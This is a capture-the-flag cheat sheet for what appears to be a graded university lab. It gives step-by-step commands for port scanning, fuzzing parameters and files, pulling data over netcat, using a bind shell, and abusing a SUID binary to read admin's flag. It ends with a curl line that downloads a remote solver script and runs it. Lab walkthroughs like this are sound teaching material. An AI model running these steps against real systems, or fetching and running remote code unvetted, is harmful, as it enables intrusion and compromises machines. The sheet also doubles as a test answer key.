# Cheat Sheet

7 tasks, each one: find a `PJATK{...}` flag and submit it in the form.
`<HTTP_PORT>`, `<SSH_PORT>`, etc. come from the nmap scan in Task 1.

---

## 0. VPN

```bash
sudo openvpn ~/Downloads/bsiws-20ca_-s32618.ovpn
```
In a second tab, check the tunnel is up:
```bash
ip a show tun0
```
If you see a `10.65.x.x` address → you're in. Keep the VPN tab open.
Also start the machine on the platform.

---

## 1. Open ports

One scan gives you all ports for the other tasks.
```bash
nmap -Pn -sV -sC -T4 -p- 192.168.100.8
```
Write down 4 ports from the SERVICE column:
- `ssh` → Task 2
- `http` → Tasks 3, 4
- `gzip`/archive → Task 5
- `unknown` (silent) → Task 6

Task 1 is marked done automatically after the scan.

---

## 2. Search (SSH + haystack)

```bash
ssh student@192.168.100.8 -p <SSH_PORT>
```
Password: `pjatk`. Then on the machine:
```bash
grep -rao 'PJATK{[^}]*}' ~/haystack
```
Leave: `exit`

---

## 3. Param Enumeration (id)

Brute-force id 1–99, find the one that shows a flag.
```bash
ffuf -w <(seq 1 99) -u 'http://192.168.100.8:<HTTP_PORT>/?id=FUZZ'
```
In the output one id has a different Size than the rest. Open it in the browser:
```
http://192.168.100.8:<HTTP_PORT>/?id=<found_id>
```

---

## 4. File Enumeration (hidden file)

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-files-lowercase.txt -u 'http://192.168.100.8:<HTTP_PORT>/FUZZ'
```
The line with `Status: 200` is the filename. Open it in the browser:
```
http://192.168.100.8:<HTTP_PORT>/<filename>
```

---

## 5. File Transfer (tgz over nc)

```bash
nc 192.168.100.8 <TAR_PORT> > loot.tgz
tar xzf loot.tgz
grep -rao 'PJATK{[^}]*}' .
```

---

## 6. Bind Shell

```bash
nc 192.168.100.8 <SHELL_PORT>
```
You land in a shell on the machine. Then:
```bash
cat ~/flag.txt
```

---

## 7. SUID Binary (owned by admin)

A SUID file runs with the owner's rights (admin), so you can use it to read admin's flag.
Two commands. SSH in (like Task 2), then:
```bash
find / -user admin -perm -4000 2>/dev/null
```
It prints a path, e.g. `/usr/bin/backdoor`. Use **that path** to read the flag:
```bash
/usr/bin/backdoor /home/admin/flag.txt
```

---

## Automatic (the script does all of the above)

```bash
curl -sL https://raw.githubusercontent.com/tohaidk/bsi-test1/main/solve_test1.py -o solve_test1.py && python3 solve_test1.py
```
Flags end up in the terminal and in `test1_flags.txt`.
